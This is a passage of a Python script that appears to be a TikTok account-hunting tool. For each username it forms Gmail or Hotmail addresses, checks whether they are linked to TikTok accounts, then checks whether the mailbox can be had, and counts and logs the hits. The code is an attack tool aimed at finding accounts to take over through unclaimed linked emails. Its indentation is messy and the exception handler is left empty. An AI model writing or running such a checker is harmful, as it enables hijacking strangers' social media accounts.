        sys.stdout.write(f'''\r            {C1}True{P} : {C1}{self.good_gmail} {Z}False {P}: {J21}{self.bad_tiktok} {X}Bad {P}: {J21}{self.bad_gmail}     \r''')
        usernames=self.get_users()
        for username in usernames:
          email=username+'@gmail.com'
          if xx =='1':
          	 if True == self.check_linked(email):
          	 	self.good_tiktok+=1
          	 	if True == self.check_gmail(username):
          	 		self.good_gmail+=1
          	 		self.info(username,xx)
          	 	else:
          	 		clear()
          	 		self.bad_gmail+=1          	 		
          	 else:
          	 	self.bad_tiktok+=1          	 	         
          elif xx =='2':
          	email = username+'@hotmail.com'
          	if True == self.check_linked(email):
          		self.good_tiktok+=1
          		if True == self.check_hotmail(username):
          			self.good_gmail+=1
          			self.info(username,xx)
          			
          		else:
          			self.bad_gmail+=1
          	else:
          		self.bad_tiktok+=1
          else:
             exit()           	                             
          sys.stdout.write(f'''\r            {C1}True{P} : {C1}{self.good_gmail} {Z}False {P}: {J21}{self.bad_tiktok} {X}Bad {P}: {J21}{self.bad_gmail}     \r''')
      except Exception as e:''
DEMO()